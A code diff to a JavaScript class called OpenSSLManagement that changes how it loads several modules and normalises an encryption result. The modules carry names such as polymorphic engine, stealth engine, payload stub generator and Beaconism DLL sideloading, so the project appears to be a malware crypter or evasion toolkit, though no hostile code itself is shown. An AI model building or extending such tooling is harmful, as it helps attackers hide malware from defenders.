@@ -286,7 +286,8 @@ class OpenSSLManagement extends EventEmitter {
 
             // EV Certificate Encryptor
             try {
-                const evCertEncryptor = require('./ev-cert-encryptor');
+                const EVCertEncryptor = require('./ev-cert-encryptor');
+                const evCertEncryptor = new EVCertEncryptor();
                 if (evCertEncryptor.initialize) {
                     await evCertEncryptor.initialize();
                 }
@@ -298,7 +299,8 @@ class OpenSSLManagement extends EventEmitter {
 
             // Polymorphic Engine
             try {
-                const polymorphicEngine = require('./polymorphic-engine');
+                const PolymorphicEngine = require('./polymorphic-engine');
+                const polymorphicEngine = new PolymorphicEngine();
                 if (polymorphicEngine.initialize) {
                     await polymorphicEngine.initialize();
                 }
@@ -310,7 +312,8 @@ class OpenSSLManagement extends EventEmitter {
 
             // Stealth Engine
             try {
-                const stealthEngine = require('./stealth-engine');
+                const StealthEngine = require('./stealth-engine');
+                const stealthEngine = new StealthEngine();
                 if (stealthEngine.initialize) {
                     await stealthEngine.initialize();
                 }
@@ -322,7 +325,8 @@ class OpenSSLManagement extends EventEmitter {
 
             // Camellia Assembly Engine
             try {
-                const camelliaAssembly = require('./camellia-assembly');
+                const CamelliaAssemblyEngine = require('./camellia-assembly');
+                const camelliaAssembly = new CamelliaAssemblyEngine();
                 if (camelliaAssembly.initialize) {
                     await camelliaAssembly.initialize();
                 }
@@ -334,7 +338,8 @@ class OpenSSLManagement extends EventEmitter {
 
             // Stub Generator (for payload encryption)
             try {
-                const stubGenerator = require('./stub-generator');
+                const StubGenerator = require('./stub-generator');
+                const stubGenerator = new StubGenerator();
                 this.engines.set('stub-generator', stubGenerator);
                 logger.info('Stub Generator loaded');
             } catch (err) {
@@ -343,7 +348,8 @@ class OpenSSLManagement extends EventEmitter {
 
             // Beaconism DLL Sideloading (for DLL encryption)
             try {
-                const beaconismDLL = require('./beaconism-dll-sideloading');
+                const BeaconismDLLSideloading = require('./beaconism-dll-sideloading');
+                const beaconismDLL = new BeaconismDLLSideloading();
                 this.engines.set('beaconism-dll', beaconismDLL);
                 logger.info('Beaconism DLL Sideloading loaded');
             } catch (err) {
@@ -797,7 +803,14 @@ class OpenSSLManagement extends EventEmitter {
                 case 'advanced-crypto':
                     // Convert data to buffer if needed for advanced-crypto
                     const dataBuffer = Buffer.isBuffer(data) ? data : Buffer.from(data, 'utf8');
-                    return await this.engines.get('advanced-crypto').encrypt(dataBuffer, options);
+                    const result = await this.engines.get('advanced-crypto').encrypt(dataBuffer, options);
+                    // Add success field and normalize the response
+                    return {
+                        ...result,
+                        success: true,
+                        encrypted: result.data,
+                        engine: 'advanced-crypto'
+                    };
                 
                 case 'burner-encryption':
                     return await this.engines.get('burner-encryption').encrypt(data, options);
